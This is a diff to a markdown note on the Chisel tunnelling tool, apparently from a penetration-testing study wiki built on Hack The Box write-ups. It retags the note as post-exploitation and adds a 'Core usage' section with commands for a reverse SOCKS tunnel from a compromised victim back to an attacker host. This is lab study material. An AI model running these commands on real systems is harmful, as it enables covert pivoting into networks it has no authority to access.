@@ -5,7 +5,7 @@ tags: [chisel, network, pivoting, port-forwarding, proxy, socks, tunneling]
 date_created: 2026-05-12
 date_updated: 2026-05-12
 sources: [0xdf-tools-chisel]
-phase: pivot
+phase: postex
 ---
 
 # Chisel
@@ -274,3 +274,12 @@ Used when the attacker can connect outbound to the victim (less common in HTB).
 
 - 0xdf HTB writeups: antique, anubis, breadcrumbs, buff, build, carpediem, cerberus, cybermonday, darkzero, derailed, feline, hancliffe
 - Chisel GitHub: https://github.com/jpillora/chisel
+
+## Core usage
+
+Reverse SOCKS tunnel (server on attacker, client on the compromised host):
+
+```bash
+./chisel server -p 8000 --reverse                 # attacker
+./chisel client 10.10.14.6:8000 R:socks           # victim -> reverse SOCKS proxy
+```
